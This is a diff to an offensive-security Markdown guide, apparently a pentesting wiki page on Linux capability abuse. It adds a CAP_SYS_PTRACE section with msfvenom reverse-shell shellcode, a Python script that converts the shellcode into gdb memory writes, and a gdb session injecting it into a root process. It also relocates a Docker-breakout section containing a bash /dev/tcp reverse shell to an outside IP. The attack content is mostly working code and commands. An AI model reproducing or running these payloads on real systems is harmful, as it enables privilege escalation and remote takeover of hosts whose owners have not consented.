@@ -489,7 +489,7 @@ ssh john@172.17.0.1 -p 2222
 
 [**CAP\_SYS\_PTRACE**](https://man7.org/linux/man-pages/man7/capabilities.7.html) allows to use `ptrace(2)` and recently introduced cross memory attach system calls such as `process_vm_readv(2)` and `process_vm_writev(2)`. If this capability is granted and the `ptrace(2)` system call itself is not blocked by a seccomp filter, this will allow an attacker to bypass other seccomp restrictions, see [PoC for bypassing seccomp if ptrace is allowed](https://gist.github.com/thejh/8346f47e359adecd1d53) or the **following PoC**:
 
-**Example with binary**
+**Example with binary (python)**
 
 ```bash
 getcap -r / 2>/dev/null
@@ -583,6 +583,80 @@ print("Final Instruction Pointer: " + hex(registers.rip))
 libc.ptrace(PTRACE_DETACH, pid, None, None)
 ```
 
+**Example with binary (gdb)**
+
+`gdb` with `ptrace` capability:
+
+```
+/usr/bin/gdb = cap_sys_ptrace+ep
+```
+
+Create a shellcode with msfvenom to inject in memory via gdb
+
+```python
+# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
+buf =  b""
+buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
+buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
+buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
+buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
+buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
+buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
+buf += b"\x0f\x05"
+
+# Divisible by 8
+payload = b"\x90" * (8 - len(buf) % 8 ) + buf
+
+# Change endianess and print gdb lines to load the shellcode in RIP directly
+for i in range(0, len(buf), 8):
+	chunk = payload[i:i+8][::-1]
+	chunks = "0x"
+	for byte in chunk:
+		chunks += f"{byte:02x}"
+
+	print(f"set {{long}}($rip+{i}) = {chunks}")
+```
+
+Debug a root process with gdb ad copy-paste the previously generated gdb lines:
+
+```bash
+# In this case there was a sleep run by root
+## NOTE that the process you abuse will die after the shellcode
+/usr/bin/gdb -p $(pgrep sleep)
+[...]
+(gdb) set {long}($rip+0) = 0x296a909090909090
+(gdb) set {long}($rip+8) = 0x5e016a5f026a9958
+(gdb) set {long}($rip+16) = 0x0002b9489748050f
+(gdb) set {long}($rip+24) = 0x48510b0e0a0a2923
+(gdb) set {long}($rip+32) = 0x582a6a5a106ae689
+(gdb) set {long}($rip+40) = 0xceff485e036a050f
+(gdb) set {long}($rip+48) = 0x6af675050f58216a
+(gdb) set {long}($rip+56) = 0x69622fbb4899583b
+(gdb) set {long}($rip+64) = 0x8948530068732f6e
+(gdb) set {long}($rip+72) = 0x050fe689485752e7
+(gdb) c
+Continuing.
+process 207009 is executing new program: /usr/bin/dash
+[...]
+```
+
+**Example with environment (Docker breakout) - Another gdb Abuse**
+
+If **GDB** is installed (or you can install it with `apk add gdb` or `apt install gdb` for example) you can **debug a process from the host** and make it call the `system` function. (This technique also requires the capability `SYS_ADMIN`)**.**
+
+```bash
+gdb -p 1234
+(gdb) call (void)system("ls")
+(gdb) call (void)system("sleep 5")
+(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
+```
+
+You won’t be able to see the output of the command executed but it will be executed by that process (so get a rev shell).
+
+{% hint style="warning" %}
+If you get the error "No symbol "system" in current context." check the previous example loading a shellcode in a program via gdb.
+{% endhint %}
+
 **Example with environment (Docker breakout) - Shellcode Injection**
 
 You can check the enabled capabilities inside the docker container using:
@@ -607,19 +681,6 @@ List **processes** running in the **host** `ps -eaf`
 3. Find a **program** to **inject** the **shellcode** into a process memory ([https://github.com/0x00pf/0x00sec\_code/blob/master/mem\_inject/infect.c](https://github.com/0x00pf/0x00sec\_code/blob/master/mem\_inject/infect.c))
 4. **Modify** the **shellcode** inside the program and **compile** it `gcc inject.c -o inject`
 5. **Inject** it and grab your **shell**: `./inject 299; nc 172.17.0.1 5600`
-
-**Example with environment (Docker breakout) - Gdb Abuse**
-
-If **GDB** is installed (or you can install it with `apk add gdb` or `apt install gdb` for example) you can **debug a process from the host** and make it call the `system` function. (This technique also requires the capability `SYS_ADMIN`)**.**
-
-```bash
-gdb -p 1234
-(gdb) call (void)system("ls")
-(gdb) call (void)system("sleep 5")
-(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
-```
-
-You won’t be able to see the output of the command executed but it will be executed by that process (so get a rev shell).
 
 ## CAP\_SYS\_MODULE
 
